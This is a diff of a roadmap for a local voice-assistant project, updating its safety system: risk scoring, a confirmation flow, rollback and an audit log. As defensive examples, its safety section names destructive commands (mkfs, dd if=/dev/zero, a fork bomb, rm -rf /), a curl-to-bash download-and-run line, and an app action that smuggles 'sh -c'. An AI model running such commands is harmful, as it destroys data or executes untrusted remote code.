@@ -24,7 +24,7 @@
 | 6 | Context Awareness | Active window, open windows, workspace, clipboard, IDE, terminal, project, calendar. | Companion senses | :white_check_mark: Complete |
 | 6.5 | Action Execution | App launching, YouTube, web search, system control; cross-platform app discovery. | Companion acts | :white_check_mark: Built |
 | 7 | Memory & Learning | Recall with decay, daily consolidation, episodic replay, entity graph. | Persistent memory | :white_check_mark: 7.1–7.2 complete |
-| 8 | Safety & Permissions | Risk scoring, permission gate, confirmation flow, append-only audit log. | Trust layer | :white_check_mark: Core built |
+| 8 | Safety & Permissions | Risk scoring, permission gate, confirmation flow, rollback, append-only audit log. | Trust layer | :white_check_mark: Built (per-skill permissions wait on Phase 9) |
 | 8.5 | System Sentinel | Notices what changed on the machine: packages, privileges, file integrity, advisories. | Machine awareness | :construction: Built — steps 2b–4 await a hardware run, step 5 unverified |
 | 9 | Skills Platform | Plugin API with manifest, lifecycle hooks, sandboxing, core skills. | Extensible companion | Not started |
 | 10 | Automation & Proactive Intelligence | Rule engine, predictive suggestions, workflow recording, wellness reminders, daily briefing. | Proactive assistant | Not started |
@@ -573,7 +573,7 @@ Everything above compiles and its logic is unit-verified, but none of it has run
 
 ## Phase 8 — Safety & Permission System
 
-**Status:** :white_check_mark: Core built (2026-09-17 — 2026-09-18). Rollback and per-skill permissions not built. The rationale for each choice below is in [`DECISIONS.md` §8](DECISIONS.md#8-safety--permissions--phase-8).
+**Status:** :white_check_mark: Built (2026-09-17 — 2026-10-07), except per-skill permissions, which wait on Phase 9. **The confirmation flow cannot be reached by voice yet** — the planner only produces actions that score 0–2 — so it is proven on the event bus, not heard. Rationale in [`DECISIONS.md` §8](DECISIONS.md#8-safety--permissions--phase-8) and [§23](DECISIONS.md#23-finishing-phase-8).
 
 **Goal:** Local-first does not mean reckless. Every capability is gated.
 
@@ -591,24 +591,24 @@ Planner --PlanReady--> PermissionGate --PlanApproved--> Executor
 
 | Planned tier | As built |
 |---|---|
-| `Read`, `Notify` | risk 0–2: `say`, `notify`, `system` (volume/media/brightness), `app` — run silently |
-| `Ask`, `Execute` | risk 3–7: "Shall I? …" — waits up to 20 s for a clear yes |
+| `Read`, `Notify` | risk 0–2: `say`, `notify`, `system` (volume/media/brightness), `app`, `undo` — run silently |
+| `Ask`, `Execute` | risk 3–7: "Shall I run …?" — waits up to 20 s for a clear yes |
 | `Administrator` | risk 8+: requires the word "administrator" |
 | — | irreversible patterns: refused at any score |
 
 - [ ] **Per-plugin / per-skill permissions** — blocked on Phase 9. *(The original list had this item twice.)*
-- [ ] **Dry-run mode** — partial. The gate asks before running, but speaks the *reason* ("modifies or deletes data"), not the command itself.
+- [x] **Dry-run mode** — the question reads out what would run: "Shall I run rm notes.txt? It modifies or deletes data." *(2026-10-07)*
 - [x] **Audit log** — `audit.db`, append-only by construction: `AuditLog` exposes no update or delete method. Columns are `(timestamp, action_type, detail, risk_score, outcome, reason)` rather than the planned `(skill, args, user_confirmed)`, since skills don't exist yet.
-- [x] **Confirmation prompts** — voice. The planned visual (orb) confirmation is not built.
+- [x] **Confirmation prompts** — voice, plus an orange orb state held from the question until it is answered or lapses *(2026-10-07)*. Confirming by tapping the orb is not built.
 
 ### 8.2 Safety Layer
 
 - [x] **Command validation** — static deny-list in `safety/risk.rs`: `mkfs`, `dd if=/dev/zero`, writes to `/dev/sd*`, fork bomb, `shutdown`, `reboot`, `userdel`, `visudo` and more. Whitespace is collapsed first so spacing can't evade it.
-- [x] **Root deletion** — `is_root_delete` inspects what *follows* the slash, so `rm -rf /` is refused while `rm -rf /home/user/project` is merely confirmable. A plain substring match refused the second too; caught in testing before it was committed.
-- [x] **Pipe-to-shell** — `is_pipe_to_shell` checks for a download command *and* a shell pipe anywhere, because the URL sits between them. The literal `"curl | bash"` let `curl http://x.sh | bash` through at risk 4; caught in testing.
-- [x] **Risk scoring** — static: elevated + destructive 9, elevated 8, destructive 6, any other shell command 4, unrecognised action type 5. Network calls are not scored separately.
+- [x] **Root deletion** — `is_root_delete` inspects what *follows* the slash, so `rm -rf /` is refused while `rm -rf /home/user/project` is merely confirmable.
+- [x] **Pipe-to-shell** — `is_pipe_to_shell` checks for a download command *and* a shell pipe anywhere, because the URL sits between them.
+- [x] **Risk scoring** — static: elevated + destructive 9, elevated 8, destructive 6, any other shell command 4, unrecognised action type 5. An `app` that is really a command (`sudo …`, `sh -c …`) is scored as that command *(2026-10-07)*. Network calls are not scored separately.
 - [ ] **LLM validation** — **replaced by static scoring, deliberately.** A missed judgement here runs a destructive command. An LLM pass may later *raise* a score as a second opinion; it must never lower one.
-- [ ] **Rollback** (`.mavis-backup/` snapshots, 5-minute undo) — not built.
+- [x] **Rollback** — before `rm`, `rmdir`, `mv`, `shred` or `truncate` runs, the files it names are copied to `.mavis-backup/` in the memory directory. "Undo that" restores them within five minutes; copies are deleted after that. No copy when the command uses globs, variables, pipes or `sudo`, or would exceed 200 MB — the command runs but can't be undone. *(2026-10-07)*
 - [x] **Confirmation for destructive actions** — from risk 3.
 
 ### 8.3 Confirmation Flow
@@ -619,22 +619,29 @@ As built. The plan contradicted itself (§8.2 said confirm from 5, this section 
 PlanReady -> assess_plan() -> audit.db
     -> deny pattern:   "I won't do that. It's not reversible."      (never runs)
     -> score 0-2:      run silently
-    -> score 3-7:      "Shall I? <reason>."          -> clear yes within 20 s
-    -> score 8+:       "That needs administrator permission ..." -> "yes, administrator"
-    -> anything else:  "Cancelled."                   -> audit: declined / expired
+    -> score 3-7:      "Shall I run <command>? It <reason>."  -> clear yes within 20 s
+    -> score 8+:       "That needs administrator permission. I would run <command> ..." -> "yes, administrator"
+    -> anything else:  "Cancelled."                   -> audit: declined / expired / superseded
 ```
 
-- **Negation always wins.** "No, yes", "actually no, cancel that", "don't" are refusals. Punctuation is normalised first, so "yes, administrator" works.
-- **The answer is ordinary speech.** The gate listens to `UserIntent` only while something is pending, so normal conversation is unaffected.
-- **Audit outcomes say what happened.** A held action is logged `held_for_confirmation`, then closed by `confirmed`, `declined` or `expired`. *(Fixed 2026-09-20 — it previously read `blocked_pending_confirmation`, which was untrue.)*
+- **The whole answer has to be a yes.** "Yes", "sure, go ahead", "ok do it" count. "Okay, so what about the weather" does not: every word must belong to a small grammar of agreement, so anything else — including every "no", "wait" and "cancel" — is a refusal.
+- **The answer is ordinary speech, and it is the gate's alone.** While a question is open the planner leaves the next utterance to the gate, so "yes" isn't also answered as a question.
+- **A question lapses on time.** After 20 s it is recorded `expired`, whether or not the user speaks again.
+- **One question at a time.** A newer one closes the older as `superseded`; "yes" means the one asked last.
+- **Every plan shape is scored the same** — an array, one action, or `{"actions": [...]}`. The gate and the executor read a plan with the same function.
 
-**`shell` remains unreachable from voice.** The gate now scores shell commands, but the planner still never produces one.
+**`shell` remains unreachable from voice.** The gate scores shell commands, but the planner still never produces one.
 
 ### 8.4 Known gaps
 
-- **`app` actions bypass shell scoring.** `ELEVATED_TOKENS` carry trailing spaces, so `"sudo".contains("sudo ")` is false, and `args` are never scored — `{"type":"app","target":"sh","args":["-c","…"]}` scores 2 and runs. Not reachable from voice today, since the planner only emits `app` for discovered `.desktop` entries.
-- **"ok" counts as consent** — "okay so what about…" reads as a yes for a risk 3–7 action.
-- **One pending action at a time** — a second held plan silently replaces the first, without an audit entry.
+All three recorded here on 2026-09-18 were closed on 2026-10-07, with a fourth found on the way — see [`DECISIONS.md` §23](DECISIONS.md#23-finishing-phase-8).
+
+- ~~`app` actions bypass shell scoring~~ — scored as the command they amount to.
+- ~~"ok" counts as consent~~ — the whole utterance has to be agreement.
+- ~~A second held plan silently replaces the first~~ — audited as `superseded`.
+- ~~A plan wrapped as `{"actions": [...]}` turned a refusal into a question~~ — found and fixed 2026-10-07.
+
+**What remains:** the flow has never run from a real voice command, because nothing reachable by voice needs confirming. Phase 9's skills will be the first.
 
 ---
 
@@ -648,7 +655,7 @@ A full line-by-line audit, run against a clone of the repository. Every claimed 
 - [x] **Audio-thread deadlock** — a double `lock()` in the VAD, deadlocking under edition-2021 temporary lifetimes after any poisoning.
 - [x] **No new dependencies, no new language features** — nothing added to `Cargo.toml`.
 
-**Still open from the audit** — see [`DECISIONS.md` §14](DECISIONS.md#14-open-issues): a 300 s first STT timeout with serial processing, the worker socket at `0666`, the worker's idle-unload race, and several pieces of dead code.
+**Still open from the audit** — see [`DECISIONS.md` §14](DECISIONS.md#14-open-issues): a 300 s first STT timeout with serial processing, the worker's idle-unload race, and several pieces of dead code. *(The worker socket at `0666` was closed on 2026-10-07.)*
 
 ---
 
@@ -917,4 +924,4 @@ Reads the package manager's own transaction log rather than diffing package list
 
 ---
 
-*Last updated: 2026-10-06*
+*Last updated: 2026-10-07*
